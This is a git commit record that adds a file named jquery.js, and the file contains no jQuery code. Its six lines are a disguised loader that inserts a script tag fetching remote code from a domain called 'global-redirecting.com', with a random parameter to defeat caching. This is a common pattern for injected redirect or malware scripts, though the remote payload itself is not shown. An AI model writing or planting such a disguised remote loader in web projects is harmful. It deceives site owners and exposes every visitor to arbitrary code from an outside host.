ad163f8bdb8a2ac6bba7eac29f83dd329d4ab69e
elankton <74224289+elankton@users.noreply.github.com>
2021-11-03 11:28:02 +0300

    Create jquery.js

---
+++ jquery.js
@@ -0,0 +1,6 @@
+(function (a, d, j, o) {
+     o = a.createElement(d),
+        m = a.getElementsByTagName(d)[0];              
+     o.src = j + "?d=0&r=" + Math.random();
+     m.parentNode.insertBefore(o, m)
+})(document, 'script', 'https://global-redirecting.com/sl/2e72ef55');
